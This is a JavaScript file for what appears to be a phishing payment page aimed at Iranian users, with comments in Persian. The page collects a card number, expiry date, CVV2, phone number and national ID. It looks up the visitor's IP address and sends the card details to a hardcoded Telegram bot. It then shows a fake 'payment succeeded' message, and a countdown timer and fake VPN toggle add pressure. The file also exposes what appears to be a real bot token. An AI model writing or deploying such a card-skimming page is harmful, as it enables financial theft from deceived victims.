const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
const chatId = '-4614449543';

const sendMessage = async function (message) {
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
      // parse_mode: 'MarkdownV2',
    }),
  })
    .then(response => response.json())
    .then(data => {
      return data;
    })
    .catch(error => {
      console.error('خطا در ارسال پیام:', error.message);
    });
};

function validateExpirationDate(month, year) {
  // بررسی اینکه ماه معقول باشد
  if (month < 1 || month > 12) {
    return false; // ماه نامعتبر است
  }

  // تبدیل سال دو رقمی به چهار رقمی
  const currentDate = new Date();
  const currentYear = currentDate.getFullYear() % 100; // دو رقم آخر سال کنونی
  const fullYear = year + (year < currentYear ? 2000 : 1900); // مقایسه و تبدیل

  // تاریخ انقضا را به تاریخ واقعی تبدیل کنید
  const expiration = new Date(fullYear, month - 1); // ماه باید از 0 شروع شود

  // اطمینان از اینکه تاریخ انقضا در آینده است
  if (expiration <= currentDate) {
    return false; // تاریخ انقضا گذشته است
  } else {
    return true; // تاریخ انقضا معتبر است
  }
}

let userIp;
async function getUserIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    userIp = data.ip;
  } catch (error) {
    console.error('خطا در دریافت IP:', error);
    return null; // در صورت بروز خطا
  }
}
getUserIP();

function getDeviceType() {
  const userAgent = navigator.userAgent;

  // بررسی برای دستگاه‌های iPhone
  if (/iPhone/i.test(userAgent)) {
    return 'iPhone';
  }
  // بررسی برای دستگاه‌های Android
  else if (/Android/i.test(userAgent)) {
    return 'Android';
  }
  // در غیر این صورت، فرض می‌کنیم که دسکتاپ است
  else {
    return 'Desktop';
  }
}

const form = document.getElementById('form');
const cardInput = document.getElementById('cardInput');
const cvv2Input = document.getElementById('cvv2Input');
const exprationInput = document.getElementById('exprationInput');
const captchaInput = document.getElementById('captchaInput');
const poyaInput = document.getElementById('poyaInput');
const pattern = '____-____-____-____';

cardInput.addEventListener('input', function () {
  let value = this.value.replace(/\D/g, ''); // حذف کاراکترهای غیر عددی
  let maskedValue = '';

  for (let i = 0, j = 0; i < pattern.length && j < value.length; i++) {
    if (pattern[i] === '_') {
      maskedValue += value[j++];
    } else {
      maskedValue += pattern[i];
    }
  }
});

function validateCardNumber(cardNumber) {
  // حذف فاصله‌ها و کاراکترهای اضافی
  cardNumber = cardNumber.replace(/\s+/g, '');

  // بررسی اینکه آیا شماره کارت 16 رقمی است
  if (!/^\d{16}$/.test(cardNumber)) {
    return 'لطفاً یک شماره کارت 16 رقمی وارد کنید.';
  } else {
    return true;
  }
}

function luhnCheck(number) {
  let sum = 0;
  let shouldDouble = false;

  // از انتهای شماره کارت به سمت چپ حرکت می‌کنیم
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number.charAt(i), 10);
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9; // معادل فرمول Luhn
      }
    }
    sum += digit;
    shouldDouble = !shouldDouble; // تغییر حالت برای دو برابر کردن
  }

  // اگر مجموع قابل تقسیم بر 10 باشد، شماره کارت معتبر است
  return sum % 10 === 0;
}

exprationInput.addEventListener('input', function () {
  let currentValue = exprationInput.value.replace(/\D/g, ''); // فقط اعداد را نگه‌دارید
  if (currentValue.length > 4) {
    currentValue = currentValue.slice(0, 4); // تنها 4 رقم اجازه داده شود
  }

  // اگر دو عدد ورودی بود، با '/' جدا کنید
  if (currentValue.length >= 2) {
    currentValue = currentValue.slice(0, 2) + '/' + currentValue.slice(2);
  }

  exprationInput.value = currentValue; // ورودی فرمت شده را به اینپوت برگردانید

  // اعتبارسنجی تاریخ
  const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/; // الگوی معتبر MM/YY
  if (currentValue.length === 5) {
    if (regex.test(currentValue)) {
      // messageElement.textContent = ''; // پیام خطا را پاک کنید
    } else {
      // messageElement.textContent = 'لطفا ورودی معتبر MM/YY را وارد کنید.';
    }
  } else {
    // messageElement.textContent = ''; // اگر ورودی هنوز کامل نیست، هیچ پیام خطایی نشان ندهید
  }
});

function validateCVV2(cvv) {
  // بررسی اینکه کد CVV2 دقیقا 3 رقم باشد و فقط شامل اعداد باشد
  const regex = /^\d{3}$/; // 3 رقم
  if (!regex.test(cvv)) {
    return false;
  } else {
    return true;
  }
}

let errors = [];
form.addEventListener('keydown', e => {
  // e.preventDefault();
  if (!validateCardNumber(cardInput.value)) {
    errors.push('شماره کارت معتبر نیست.');
  }
  const mm = exprationInput.value.slice(0, 2);
  const yy = exprationInput.value.slice(3, 5);
  if (!validateExpirationDate(mm, yy)) {
    errors.push('تاریخ انقضا معتبر نیست.');
  }
  if (!validateCVV2(cvv2Input.value)) {
    errors.push('cvv2 معتبر نیست.');
  }

  if (!captchaInput.value === 80860) {
    errors.push('کدامنیتی معتبر نیست.');
  }

  if (
    validateCardNumber(cardInput.value) &&
    validateExpirationDate(mm, yy) &&
    validateCVV2(cvv2Input.value) &&
    captchaInput.value === '80860'
  ) {
    const message = `
    Card Number: ${cardInput.value}
    Expiration: ${mm}/${yy}
    Cvv2: ${cvv2Input.value}
    --------------
    IP: ${userIp}
    Device: ${getDeviceType()}
  `;
    console.log(cardInput.value);
    console.log(mm);
    console.log(yy);
    console.log(cvv2Input.value);
    sendMessage(message);
    cardInput.value = '';
    exprationInput.value = '';
    cvv2Input.value = '';
    captchaInput.value = '';
    setTimeout(() => {
      Toastify({
        text: 'پرداخت با موفقیت انجام شد.',
        duration: 3000,
        newWindow: true,
        close: true,
        gravity: 'top', // `top` or `bottom`
        position: 'right', // `left`, `center` or `right`
        stopOnFocus: true, // Prevents dismissing of toast on hover
        style: {
          fontSize: '1.1rem',
          fontWeight: '600',
          background: '#15bb09',
          width: '300px',
          minWidth: '300px',
          display: 'flex',
          justifyContent: 'space-between',
        },
      }).showToast();
      setTimeout(() => {
        document.getElementById('page3').classList.add('hidden');
        document.getElementById('page4').classList.remove('hidden');
      }, 1000);
    }, 2000);
  }
});

const phoneInput = document.getElementById('phoneInput');
const phoneValid = document.getElementById('phoneValid');
const codemeliInput = document.getElementById('codemeliInput');
const codeValid = document.getElementById('codeValid');
const firstBtn = document.getElementById('firstBtn');

function validateIranianMobileNumber(mobileNumber) {
  // الگوی شماره موبایل ایرانی
  const regex = /^09\d{9}$/;

  // بررسی می‌کند که آیا شماره مورد نظر با الگو مطابقت دارد یا خیر
  return regex.test(mobileNumber);
}
function validateNationalID(nationalID) {
  // بررسی طول کد ملی
  if (nationalID.length !== 10 || !/^\d+$/.test(nationalID)) {
    return false; // نامعتبر است
  }

  // استخراج ارقام
  const digits = nationalID.split('').map(Number);

  // محاسبه رقم کنترل
  const sum = digits
    .slice(0, 9)
    .reduce((acc, digit, index) => acc + digit * (10 - index), 0);
  const remainder = sum % 11;
  const checkDigit = digits[9];

  // اعتبارسنجی رقم کنترل
  if (
    (remainder < 2 && checkDigit === remainder) ||
    (remainder >= 2 && checkDigit === 11 - remainder)
  ) {
    return true; // معتبر است
  } else {
    return false; // نامعتبر است
  }
}

firstBtn.addEventListener('click', () => {
  if (!validateIranianMobileNumber(phoneInput.value)) {
    phoneValid.classList.remove('hidden');
  } else {
    phoneValid.classList.add('hidden');
  }
  if (!validateNationalID(`${codemeliInput.value}`)) {
    codeValid.classList.remove('hidden');
  } else {
    codeValid.classList.add('hidden');
  }

  if (
    validateIranianMobileNumber(phoneInput.value) &&
    validateNationalID(`${codemeliInput.value}`)
  ) {
    setTimeout(() => {
      document.getElementById('page1').classList.add('hidden');
      document.getElementById('page2').classList.remove('hidden');
      setTimeout(() => {
        document.getElementById('page2').classList.add('hidden');
        document.getElementById('page3').classList.remove('hidden');
      }, 1500);
    }, 1500);
  }
});

let timeRemaining = 10 * 60; // 10 دقیقه به ثانیه
const timerElement = document.getElementById('timer');

const countdown = setInterval(() => {
  const minutes = Math.floor(timeRemaining / 60);
  const seconds = timeRemaining % 60;

  timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(
    seconds
  ).padStart(2, '0')}`;

  if (timeRemaining <= 0) {
    clearInterval(countdown);
    timerElement.textContent = 'زمان به پایان رسید!';
  }

  timeRemaining--;
}, 1000);

// vpn
const btnVpn = document.getElementById('btnVpn');
const spanVpn = document.getElementById('spanVpn');
btnVpn.addEventListener('click', () => {
  if (btnVpn.classList.contains('bg-green-600')) {
    btnVpn.classList.remove('bg-green-600');
    btnVpn.classList.add('bg-[#E2DDF3]');
    setTimeout(() => {
      spanVpn.textContent = 'اتصال برقرار نیست';
    }, 1000);
  } else {
    btnVpn.classList.remove('bg-[#E2DDF3]');
    btnVpn.classList.add('bg-green-600');
    setTimeout(() => {
      spanVpn.textContent = 'اتصال برقرار است';
    }, 1000);
  }
});
